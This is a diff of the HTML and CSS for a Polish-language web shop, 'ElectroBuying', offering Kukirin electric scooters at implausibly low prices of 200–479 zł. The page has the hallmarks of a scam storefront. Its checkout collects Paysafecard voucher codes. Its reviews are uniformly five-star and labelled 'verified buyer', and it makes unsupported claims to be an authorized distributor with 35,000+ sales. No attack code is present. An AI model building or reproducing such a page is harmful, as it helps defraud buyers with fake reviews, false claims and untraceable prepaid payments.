-            font-family: 'Orbitron', sans-serif;
-        }
-
-        #productModal .product-modal-specs {
-            margin: 25px 0;
-            font-size: 1.1rem;
-            line-height: 1.6;
-            color: #ddd;
-            max-height: 200px;
-            overflow-y: auto;
-        }
-
-        #productModal .product-modal-specs h4 {
-            color: var(--primary-neon);
-            font-weight: 700;
-            margin-bottom: 10px;
-            font-size: 1.3rem;
-            text-shadow: 0 0 5px var(--primary-neon);
-        }
-
-        #productModal .product-modal-specs ul {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-        }
-
-        #productModal .product-modal-specs li {
-            margin-bottom: 8px;
-            padding-left: 15px;
-            position: relative;
-        }
-        
-        #productModal .product-modal-specs li:before {
-            content: "•";
-            color: var(--secondary-neon);
-            position: absolute;
             left: 0;
             top: 0;
-            font-size: 1.5rem;
-            line-height: 1;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            overflow: auto;
         }
 
-        #productModal .product-modal-add-btn {
-            background: var(--button-bg);
-            color: var(--bg-color);
+        .checkout-modal-content {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            margin: 2.5% auto;
+            padding: 3rem;
+            border-radius: 25px;
+            width: 95%;
+            max-width: 700px;
+            max-height: 95vh;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            position: relative;
+            overflow-y: auto;
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+        .checkout-modal-content::-webkit-scrollbar {
+            display: none;
+        }
+
+        .checkout-modal-content h3 {
+            background: linear-gradient(135deg, #00d4ff, #7c3aed);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-size: 2.2rem;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: white;
+            font-weight: 500;
+            font-size: 0.95rem;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 0.8rem;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            color: white;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            -webkit-appearance: none; /* Remove default styling for select */
+            -moz-appearance: none;
+            appearance: none;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #00d4ff;
+            box-shadow: 0 0 10px rgba(0, 212, 255, 0.3);
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .form-group select {
+            background-image: url('data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%23ffffff%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-6.5%200-12.3%203.2-16.1%208.1-3.8%204.9-4.5%2011.6-2.1%2017.1l139.7%20192c3.8%205.3%2010%208.6%2016.7%208.6s12.9-3.3%2016.7-8.6l139.7-192c2.4-5.5%201.7-12.2-2.1-17.1z%22%2F%3E%3C%2Fsvg%3E');
+            background-repeat: no-repeat;
+            background-position: right 0.7em top 50%, 0 0;
+            background-size: 0.65em auto, 100%;
+            padding-right: 2.5em;
+        }
+
+        /* Styling for select options */
+        .form-group select option {
+            background: #1a1a2e; /* Dark background for options */
+            color: white;
+            padding: 0.5rem;
+        }
+
+        .continue-btn, .payment-submit-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #00d4ff, #7c3aed);
+            color: white;
+            padding: 1rem;
             border: none;
-            padding: 20px 40px;
+            border-radius: 15px;
+            font-size: 1.1rem;
+            font-weight: 700;
             cursor: pointer;
-            border-radius: 20px;
+            transition: all 0.3s ease;
+            margin-top: 1rem;
+        }
+
+        .continue-btn:hover, .payment-submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(0, 212, 255, 0.4);
+        }
+
+        /* Checkout steps styling */
+        #shipping-step, #payment-step {
+            transition: opacity 0.5s ease-in-out;
+        }
+
+        .order-summary {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .order-summary p {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.8rem;
+            font-size: 1.1rem;
+            color: rgba(255, 255, 255, 0.9);
+        }
+        .order-summary p:last-child {
+            margin-bottom: 0;
+            padding-top: 1rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
             font-size: 1.4rem;
             font-weight: 700;
-            box-shadow: 0 5px 20px var(--shadow-light), 0 2px 10px var(--shadow-dark);
-            font-family: 'Electrolize', sans-serif;
-            letter-spacing: 2px;
-            width: 100%;
+            color: #00d4ff;
+        }
+        .order-summary span {
+            font-weight: 600;
+        }
+
+        /* Payment method specific forms */
+        .payment-method-form {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin-top: 1.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .payment-method-form .form-group {
+            margin-bottom: 1rem;
+        }
+        .payment-method-form .message {
+            margin-top: 1.5rem;
+            padding: 1rem;
+            border-radius: 10px;
             text-align: center;
-            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+            font-weight: 500;
+            line-height: 1.5;
         }
-        
-        #productModal .product-modal-add-btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 8px 25px var(--shadow-dark), 0 4px 15px var(--shadow-light);
+        .payment-method-form .message.info {
+            background: rgba(0, 212, 255, 0.1);
+            color: #00d4ff;
+            border: 1px solid rgba(0, 212, 255, 0.3);
+        }
+        .payment-method-form .message.error {
+            background: rgba(236, 72, 153, 0.1);
+            color: #ec4899;
+            border: 1px solid rgba(236, 72, 153, 0.3);
+        }
+        .payment-method-form .message.success {
+            background: rgba(124, 237, 58, 0.1);
+            color: #7ced3a;
+            border: 1px solid rgba(124, 237, 58, 0.3);
+        }
+        .payment-method-form .message.success span {
+            display: block;
+            font-size: 0.9em;
+            margin-top: 0.5em;
+            opacity: 0.8;
         }
 
-        @media (max-width: 992px) {
-            #productModal { flex-direction: column; text-align: center; }
-            #productModal h2 { text-align: center; font-size: 2rem; }
-            #productModal .product-modal-details { text-align: center; }
-            #productModal .product-modal-img-container { min-width: auto; max-width: 100%; height: 250px; }
-            #productModal .product-modal-specs { text-align: left; }
-            .product { width: 280px; }
-            .products { gap: 20px; }
-            header { font-size: 2.5rem; }
-            .cart-icon { top: 20px; left: 20px; width: 60px; height: 60px; }
-            .cart-icon svg { width: 32px; height: 32px; }
-            .cart-count { top: 10px; left: 40px; }
+        /* PSC specific styles */
+        .psc-codes-container {
+            margin-bottom: 1rem;
+        }
+        .psc-code-entry {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 0.8rem;
+        }
+        .psc-code-entry input {
+            flex-grow: 1;
+        }
+        .add-psc-code-btn {
+            background: linear-gradient(135deg, #00d4ff, #7c3aed);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 35px;
+            height: 35px;
+            font-size: 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            flex-shrink: 0;
+        }
+        .add-psc-code-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
+        }
+        .remove-psc-code-btn {
+            background: none;
+            border: none;
+            color: #ec4899;
+            font-size: 1.5rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            flex-shrink: 0;
+        }
+        .remove-psc-code-btn:hover {
+            transform: scale(1.1);
         }
 
+
+        /* About Section */
+        .about {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(30px);
+            border-radius: 30px;
+            padding: 4rem;
+            margin: 3rem 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: white;
+        }
+
+        .about-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 4rem;
+            align-items: center;
+        }
+
+        .about-text h3 {
+            font-size: 2.2rem;
+            margin-bottom: 1.5rem;
+            background: linear-gradient(135deg, #00d4ff, #7c3aed);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 700;
+        }
+
+        .about-text p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            line-height: 1.8;
+            margin-bottom: 1.8rem;
+            font-weight: 400;
+        }
+
+        .about-stats {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1.5rem;
+        }
+
+        .stat-item {
+            text-align: center;
+            padding: 1.5rem;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+
+        .stat-item:hover {
+            background: rgba(255, 255, 255, 0.08);
+            transform: translateY(-5px);
+        }
+
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, #00d4ff, #7c3aed);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .stat-label {
+            opacity: 0.8;
+            font-size: 1rem;
+            font-weight: 500;
+            margin-top: 0.5rem;
+        }
+
+        /* Reviews Section */
+        .reviews {
+            padding: 5rem 0;
+        }
+
+        .reviews-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 2.5rem;
+            margin-top: 4rem;
+        }
+
+        .review-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(30px);
+            border-radius: 25px;
+            padding: 2.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: white;
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .review-card:hover {
+            transform: translateY(-10px);
+            border-color: rgba(0, 212, 255, 0.2);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+            background: rgba(255, 255, 255, 0.08);
+        }
+
+        .stars {
+            color: #ffd700;
+            font-size: 1.3rem;
+            margin-bottom: 1.5rem;
+            filter: drop-shadow(0 0 5px rgba(255, 215, 0, 0.3));
+        }
+
+        .review-text {
+            font-style: italic;
+            opacity: 0.9;
+            margin-bottom: 2rem;
+            font-size: 1.1rem;
+            line-height: 1.7;
+            font-weight: 400;
+        }
+
+        .reviewer {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .reviewer-avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00d4ff, #7c3aed);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            color: white;
+            font-size: 1.5rem;
+            box-shadow: 0 5px 15px rgba(0, 212, 255, 0.3);
+        }
+
+        .reviewer-info h4 {
+            font-weight: 600;
+            margin-bottom: 0.3rem;
+            font-size: 1.1rem;
+        }
+
+        .reviewer-info p {
+            opacity: 0.7;
+            font-size: 0.9rem;
+        }
+
+        /* Load More Button */
+        .load-more-container {
+            text-align: center;
+            margin-top: 3rem;
+        }
+
+        .load-more-btn {
+            background: linear-gradient(135deg, #7c3aed, #ec4899);
+            color: white;
+            padding: 1rem 2.5rem;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.3);
+        }
+
+        .load-more-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(236, 72, 153, 0.4);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* Scroll to Top Button */
+        #scroll-to-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: linear-gradient(135deg, #ec4899, #f59e0b);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            font-size: 1.8rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease, transform 0.3s ease;
+            z-index: 1000;
+            box-shadow: 0 5px 15px rgba(236, 72, 153, 0.4);
+        }
+
+        #scroll-to-top.show {
+            opacity: 1;
+            visibility: visible;
+            transform: translateY(0);
+        }
+
+        #scroll-to-top:hover {
+            transform: translateY(-5px) scale(1.1);
+            box-shadow: 0 8px 20px rgba(236, 72, 153, 0.6);
+        }
+
+        /* Footer */
+        footer {
+            background: rgba(0, 0, 0, 0.3);
+            color: white;
+            text-align: center;
+            padding: 3rem 0;
+            margin-top: 5rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* Responsive */
         @media (max-width: 768px) {
-            header { font-size: 2rem; padding: 40px 15px 25px; }
-            .products { padding: 20px 10px; gap: 15px; }
-            .product { width: 45%; }
-            .scooter-bg, .scooter-bg2 { display: none; }
-            .modal { min-width: 90vw; padding: 20px; }
-            #productModal { flex-direction: column; gap: 20px; padding: 20px; }
-            #productModal h2 { font-size: 1.8rem; }
-            #productModal .product-modal-price { font-size: 1.6rem; }
-            #productModal .product-modal-add-btn { font-size: 1.2rem; padding: 15px 25px; }
-            #productModal .product-modal-specs {
-                max-height: 150px;
-                overflow-y: auto;
+            .hero h1 {
+                font-size: 3rem;
             }
-            #cart-panel {
-                width: 90%;
-                max-width: 400px;
-                padding: 20px;
-                transform: scale(0.9); /* Utrzymanie animacji */
+
+            .hero-subtitle {
+                font-size: 1.4rem;
             }
-            .cart-modal-bg.open #cart-panel {
-                transform: scale(1);
+
+            .nav-links {
+                display: none;
             }
+
+            .about-content {
+                grid-template-columns: 1fr;
+            }
+
+            .products-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .about-stats {
+                grid-template-columns: 1fr;
+            }
+
+            .section-title {
+                font-size: 2.5rem;
+            }
+
+            .cart-sidebar {
+                width: 100%;
+                right: -100%;
+            }
+
+            .modal-content, .checkout-modal-content {
+                width: 95%;
+                margin: 2% auto;
+                padding: 2rem;
+                min-height: unset;
+                max-height: 90vh;
+            }
+
+            .modal-product-info {
+                flex-direction: column;
+            }
+        }
+
+        /* Scroll animations */
+        .fade-in {
+            opacity: 0;
+            transform: translateY(50px);
+            transition: all 0.8s ease;
+        }
+
+        .fade-in.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* Cart Notification */
+        .cart-notification {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 1rem 2rem;
+            border-radius: 10px;
+            z-index: 2001;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+        }
+
+        .cart-notification.show {
+            opacity: 1;
+            visibility: visible;
         }
     </style>
 </head>
 <body>
-    <header>ElectroBuying</header>
-    <img class="scooter-bg" src="https://cdn.pixabay.com/photo/2017/01/31/13/14/scooter-2027660_1280.png" alt="Ilustracja hulajnogi">
-    <img class="scooter-bg2" src="https://cdn.pixabay.com/photo/2017/01/31/13/14/scooter-2027660_1280.png" alt="Ilustracja hulajnogi 2">
-    <div class="products" id="products"></div>
-    <div class="cart-icon" id="cartIcon" title="Pokaż koszyk">
-        <svg viewBox="0 0 24 24">
-            <path d="M7 18c-1.104 0-2 .896-2 2s.896 2 2 2 2-.896 2-2-.896-2-2-2zm10 0c-1.104 0-2 .896-2 2s.896 2 2 2 2-.896 2-2-.896-2-2-2zm1.447-2.105l1.553-9.895h-16l1.553 9.895c.091.583.595 1.105 1.184 1.105h10.526c.589 0 1.093-.522 1.184-1.105zm-13.447-11.895v-2c0-1.104.896-2 2-2h10c1.104 0 2 .896 2 2v2h-14z"/>
-        </svg>
-        <span class="cart-count" id="cartCount">0</span>
+    <!-- Navigation -->
+    <nav>
+        <div class="nav-container">
+            <div class="logo">ElectroBuying</div>
+            <ul class="nav-links">
+                <li><a href="#home">Strona główna</a></li>
+                <li><a href="#products">Produkty</a></li>
+                <li><a href="#low-price-secret">Niskie Ceny</a></li> <!-- New link -->
+                <li><a href="#about">O nas</a></li>
+                <li><a href="#reviews">Opinie</a></li>
+                <li>
+                    <button class="cart-icon" id="cart-icon-btn" onclick="toggleCart()">
+                        🛒
+                        <span class="cart-count" id="cart-count">0</span>
+                    </button>
+                </li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section id="home" class="hero">
+        <div class="hero-content">
+            <h1>ElectroBuying</h1>
+            <div class="hero-subtitle">Hulajnogi Kukirin - Najlepsza jakość</div>
+            <p>Odkryj pełną gamę hulajnóg elektrycznych Kukirin. Od podstawowych modeli po zaawansowane wersje - znajdź idealną dla siebie!</p>
+            <a href="#products" class="cta-button">Poznaj kolekcję Kukirin</a>
+        </div>
+    </section>
+
+    <!-- Products Section -->
+    <section id="products">
+        <div class="container">
+            <h2 class="section-title fade-in">Hulajnogi Kukirin</h2>
+            <div class="products-grid">
+                <div class="product-card fade-in" onclick="showProductDetails('g2')">
+                    <div class="product-image-wrapper product-icon-display">
+                        <span class="product-icon">🛴</span>
+                    </div>
+                    <h3 class="product-name">Kukirin G2</h3>
+                    <div class="product-price">200 zł</div>
+                    <p class="product-description">Podstawowy model z potężnym silnikiem 800W, zasięgiem 55km i prędkością do 45 km/h. Świetny start z hulajnogami elektrycznymi.</p>
+                    <button class="buy-button" onclick="event.stopPropagation(); addToCart('Kukirin G2', 200)">Dodaj do koszyka</button>
+                </div>
+
+                <div class="product-card fade-in" onclick="showProductDetails('g2pro')">
+                    <div class="product-image-wrapper product-icon-display">
+                        <span class="product-icon">💨</span>
+                    </div>
+                    <h3 class="product-name">Kukirin G2 Pro</h3>
+                    <div class="product-price">279 zł</div>
+                    <p class="product-description">Ulepszona wersja G2 z silnikiem 600W, zwiększonym zasięgiem do 58km. Doskonały balans ceny i wydajności.</p>
+                    <button class="buy-button" onclick="event.stopPropagation(); addToCart('Kukirin G2 Pro', 279)">Dodaj do koszyka</button>
+                </div>
+
+                <div class="product-card fade-in" onclick="showProductDetails('g2master')">
+                    <div class="product-image-wrapper product-icon-display">
+                        <span class="product-icon">🏆</span>
+                    </div>
+                    <h3 class="product-name">Kukirin G2 Master</h3>
+                    <div class="product-price">300 zł</div>
+                    <p class="product-description">Podwójny silnik 2x1000W (2000W łącznie!) z zasięgiem 70km i prędkością 60 km/h. Dla prawdziwych miłośników mocy.</p>
+                    <button class="buy-button" onclick="event.stopPropagation(); addToCart('Kukirin G2 Master', 300)">Dodaj do koszyka</button>
+                </div>
+
+                <div class="product-card fade-in" onclick="showProductDetails('g3')">
+                    <div class="product-image-wrapper product-icon-display">
+                        <span class="product-icon">🛴</span>
+                    </div>
+                    <h3 class="product-name">Kukirin G3</h3>
+                    <div class="product-price">279 zł</div>
+                    <p class="product-description">Zaawansowany model z silnikiem 1200W, zasięgiem 70km i maksymalną prędkością 50 km/h. Wyższa klasa za przystępną cenę.</p>
+                    <button class="buy-button" onclick="event.stopPropagation(); addToCart('Kukirin G3', 279)">Dodaj do koszyka</button>
+                </div>
+
+                <div class="product-card fade-in" onclick="showProductDetails('g3pro')">
+                    <div class="product-image-wrapper product-icon-display">
+                        <span class="product-icon">💨</span>
+                    </div>
+                    <h3 class="product-name">Kukirin G3 Pro</h3>
+                    <div class="product-price">300 zł</div>
+                    <p class="product-description">Podwójny silnik 2x1200W, zasięg 80km i maksymalna prędkość 65 km/h. Najwyższa wydajność w ofercie G3.</p>
+                    <button class="buy-button" onclick="event.stopPropagation(); addToCart('Kukirin G3 Pro', 300)">Dodaj do koszyka</button>
+                </div>
+
+                <div class="product-card fade-in" onclick="showProductDetails('g4')">
+                    <div class="product-image-wrapper product-icon-display">
+                        <span class="product-icon">🏆</span>
+                    </div>
+                    <h3 class="product-name">Kukirin G4</h3>
+                    <div class="product-price">400 zł</div>
+                    <p class="product-description">Potężny silnik 2000W, zasięg 75km i prędkość maksymalna 70 km/h. Dla wymagających użytkowników szukających najwyższych osiągów.</p>
+                    <button class="buy-button" onclick="event.stopPropagation(); addToCart('Kukirin G4', 400)">Dodaj do koszyka</button>
+                </div>
+
+                <div class="product-card fade-in" onclick="showProductDetails('g4max')">
+                    <div class="product-image-wrapper product-icon-display">
+                        <span class="product-icon">🚀</span>
+                    </div>
+                    <h3 class="product-name">Kukirin G4 Max</h3>
+                    <div class="product-price discounted">
+                        479 zł
+                        <span class="old-price">700 zł</span>
+                        <span class="discount-badge">-32%</span>
+                    </div>
+                    <p class="product-description">TOP MODEL! Podwójny silnik 2x1600W (3200W łącznie), zasięg 95km i maksymalna prędkość 86 km/h. Najwyższa klasa!</p>
+                    <button class="buy-button" onclick="event.stopPropagation(); addToCart('Kukirin G4 Max', 479)">Dodaj do koszyka</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- New Section: Our Low Price Secret -->
+    <section id="low-price-secret">
+        <div class="container">
+            <h2 class="section-title fade-in">Nasza Tajemnica Niskich Cen</h2>
+            <div class="about fade-in"> <!-- Reusing .about for consistent styling -->
+                <div class="about-content" style="grid-template-columns: 1fr;"> <!-- Single column for this content -->
+                    <div class="about-text">
+                        <h3>Jak udaje nam się oferować tak konkurencyjne ceny?</h3>
+                        <p>✓ **Bezpośredni import**: Współpracujemy bezpośrednio z producentem Kukirin, eliminując pośredników i związane z nimi marże. To skraca łańcuch dostaw i obniża koszty.</p>
+                        <p>✓ **Zakupy hurtowe**: Zamawiamy hulajnogi w ogromnych ilościach, co pozwala nam negocjować znacznie niższe ceny jednostkowe. Im więcej kupujemy, tym mniej płacimy za sztukę.</p>
+                        <p>✓ **Optymalizacja logistyki**: Dzięki zaawansowanym systemom logistycznym i efektywnemu zarządzaniu magazynem, minimalizujemy koszty transportu i przechowywania produktów.</p>
+                        <p>✓ **Sprzedaż online**: Skupiamy się wyłącznie na sprzedaży internetowej. Brak kosztów utrzymania drogich, fizycznych salonów sprzedaży pozwala nam unikać wysokich narzutów.</p>
+                        <p>Dzięki tym działaniom możemy oferować najlepsze hulajnogi Kukirin w bezkonkurencyjnych cenach, bez kompromisów w kwestii jakości i obsługi klienta. Dołącz do grona zadowolonych klientów ElectroBuying i przekonaj się sam!</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- About Section -->
+    <section id="about">
+        <div class="container">
+            <h2 class="section-title fade-in">O Nas</h2>
+            <div class="about fade-in">
+                <div class="about-content">
+                    <div class="about-text">
+                        <h3>Nasza Historia</h3>
+                        <p>ElectroBuying to autoryzowany dystrybutor hulajnóg elektrycznych marki Kukirin w Polsce. Od ponad 8 lat specjalizujemy się w dostarczaniu najwyższej jakości pojazdów elektrycznych.</p>
+                        
+                        <p>Jako oficjalny partner Kukirin, gwarantujemy oryginalność wszystkich produktów, pełną gwarancję producenta oraz profesjonalny serwis posprzedażowy w całej Polsce.</p>
+
+                        <p>Hulajnogi Kukirin to synonim jakości, niezawodności i innowacyjności. Każdy model przechodzi rygorystyczne testy przed wprowadzeniem do sprzedaży.</p>
+
+                        <h3>Dlaczego Kukirin?</h3>
+                        <p>✓ Autoryzowany dystrybutor marki Kukirin</p>
+                        <p>✓ Oryginalne produkty z gwarancją producenta</p>
+                        <p>✓ Profesjonalny serwis w całej Polsce</p>
+                        <p>✓ Konkurencyjne ceny i regularne promocje</p>
+                        <p>✓ Szybka dostawa i bezpieczne opakowanie</p>
+                        <p>✓ Kompleksowe doradztwo w wyborze modelu</p>
+                    </div>
+                    <div class="about-stats">
+                        <div class="stat-item">
+                            <div class="stat-number">35,000+</div>
+                            <div class="stat-label">Sprzedanych hulajnóg</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-number">8+</div>
+                            <div class="stat-label">lat doświadczenia</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-number">7</div> <!-- Updated count -->
+                            <div class="stat-label">Modeli Kukirin</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-number">99.5%</div>
+                            <div class="stat-label">Zadowolonych klientów</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Reviews Section -->
+    <section id="reviews">
+        <div class="container">
+            <h2 class="section-title fade-in">Opinie Klientów</h2>
+            <div class="reviews-grid" id="reviews-grid">
+                <div class="review-card fade-in">
+                    <div class="stars">★★★★★</div>
+                    <p class="review-text">"Kukirin G4 Max to absolutny hit! Moc, zasięg i jakość wykonania są niesamowite. Po miesiącu używania jestem w pełni zadowolony."</p>
+                    <div class="reviewer">
+                        <div class="reviewer-avatar">M</div>
+                        <div class="reviewer-info">
+                            <h4>Marcin Kowalski</h4>
+                            <p>Zweryfikowany kupujący - G4 Max</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="review-card fade-in">
+                    <div class="stars">★★★★★</div>
+                    <p class="review-text">"G2 Pro to świetny wybór na początek. Niezawodna, wygodna i w doskonałej cenie. Polecam każdemu, kto rozpoczyna przygodę z hulajnogami."</p>
+                    <div class="reviewer">
+                        <div class="reviewer-avatar">A</div>
+                        <div class="reviewer-info">
+                            <h4>Anna Nowak</h4>
+                            <p>Zweryfikowany kupujący - G2 Pro</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="review-card fade-in">
+                    <div class="stars">★★★★★</div>
+                    <p class="review-text">"Obsługa klienta na najwyższym poziomie! Pomogli w wyborze G2 Master, szybka dostawa i produkt zgodny z opisem. Bardzo polecam!"</p>
+                    <div class="reviewer">
+                        <div class="reviewer-avatar">P</div>
+                        <div class="reviewer-info">
+                            <h4>Piotr Wiśniewski</h4>
+                            <p>Zweryfikowany kupujący - G2 Master</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="review-card fade-in">
+                    <div class="stars">★★★★★</div>
+                    <p class="review-text">"Kukirin G4 to marzenie każdego miłośnika prędkości! 70 km/h i niezwykła stabilność. Warto każdej złotówki!"</p>
+                    <div class="reviewer">
+                        <div class="reviewer-avatar">K</div>
+                        <div class="reviewer-info">
+                            <h4>Katarzyna Lewandowska</h4>
+                            <p>Zweryfikowany kupujący - G4</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="review-card fade-in">
+                    <div class="stars">★★★★★</div>
+                    <p class="review-text">"G2 Master z podwójnym silnikiem to potęga! Świetne przyspieszenie i komfort jazdy. Zdecydowanie polecam ten model."</p>
+                    <div class="reviewer">
+                        <div class="reviewer-avatar">T</div>
+                        <div class="reviewer-info">
+                            <h4>Tomasz Zieliński</h4>
+                            <p>Zweryfikowany kupujący - G2 Master</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="review-card fade-in">
+                    <div class="stars">★★★★★</div>
+                    <p class="review-text">"Fantastyczne doświadczenie zakupowe! G3 Pro spełnia wszystkie oczekiwania. Jakość Kukirin to gwarancja satysfakcji."</p>
+                    <div class="reviewer">
+                        <div class="reviewer-avatar">M</div>
+                        <div class="reviewer-info">
+                            <h4>Magdalena Kaczmarek</h4>
+                            <p>Zweryfikowany kupujący - G3 Pro</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="load-more-container">
+                <button class="load-more-btn" id="load-more-btn">Wyświetl więcej opinii (pozostało 200+)</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Cart Sidebar -->
+    <div class="cart-sidebar" id="cart-sidebar">
+        <div class="cart-header">
+            <h2 class="cart-title">Twój Koszyk</h2>
+            <button class="cart-close" onclick="toggleCart()">&times;</button>
+        </div>
+        
+        <div class="cart-items" id="cart-items">
+            <p style="opacity: 0.7; text-align: center;">Koszyk jest pusty</p>
+        </div>
+        
+        <div class="cart-total" id="cart-total" style="display: none;">
+            Suma: <span id="total-amount">0 zł</span>
+        </div>
+        
+        <button class="checkout-btn" id="checkout-btn" style="display: none;" onclick="openCheckoutModal()">
+            Przejdź do kasy
+        </button>
     </div>
-    <div class="cart-modal-bg" id="cartModalBg">
-        <div id="cart-panel">
-            <button class="close-cart" id="closeCart" title="Zamknij koszyk">&times;</button>
-            <h2>Koszyk</h2>
-            <div id="cartError"></div>
-            <div id="cartItems"></div>
-            <div class="cart-total" id="cartTotal"></div>
-            <button class="checkout" id="checkoutBtn">Zamów</button>
+
+    <!-- Product Details Modal -->
+    <div class="modal" id="product-modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeProductDetails()">&times;</span>
+            <h2 id="modal-title"></h2>
+            <div id="modal-product-info" class="modal-product-info">
+                <!-- Product image, price, description -->
+            </div>
+            <h3 style="color: #00d4ff; margin-bottom: 1.5rem; text-align: center;">Specyfikacja techniczna:</h3>
+            <div id="modal-specs" class="specs-grid">
+                <!-- Product specifications will be loaded here -->
+            </div>
+            <div id="modal-reviews" class="product-reviews-modal">
+                <!-- Product-specific reviews will be loaded here -->
+            </div>
         </div>
     </div>
-    <div class="modal-bg" id="payModalBg">
-        <div class="modal" id="payModal">
-            <button class="close-modal" id="closePayModal" title="Zamknij">&times;</button>
-            <h2 id="payModalTitle">Podaj dane do wysyłki</h2>
-            <form class="dane-form" id="daneForm">
-                <input type="text" id="daneImieNazwisko" placeholder="Imię i Nazwisko" required pattern="[A-Za-z\sąęłńóśźżĄĘŁŃÓŚŹŻ]{3,}" title="Wpisz tylko litery">
-                <input type="text" id="daneAdres" placeholder="Ulica i numer" required>
-                <input type="text" id="daneMiejscowosc" placeholder="Miejscowość" required>
